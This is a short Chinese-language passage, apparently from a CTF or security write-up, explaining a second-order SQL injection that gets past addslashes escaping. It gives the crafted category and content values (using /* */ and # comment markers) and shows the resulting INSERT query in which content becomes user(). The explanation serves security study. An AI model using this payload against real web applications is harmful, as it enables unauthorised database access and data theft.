我们发现每个参数都进行了addslashes过滤,但是这些参数都是先存入数据库，再执行查询，那么就存在二次注入

利用点就在这里，我们通过对category构造，来控制content变量

category=1’,content=user(),/*
content=*/#

这样执行的语句就是
$sql = “insert into comment
set category = ‘1’,content=user(),/‘,
content = ‘/#’,
bo_id = ‘$bo_id’”;

content的值被替换成了user()
而原来的content构造注释符/**/注释中间的内容并且用#注释后面的内容，最后真正有效的内容其实只有

$sql = “insert into comment
set category = ‘1’,content=user(),
bo_id = ‘$bo_id’”;
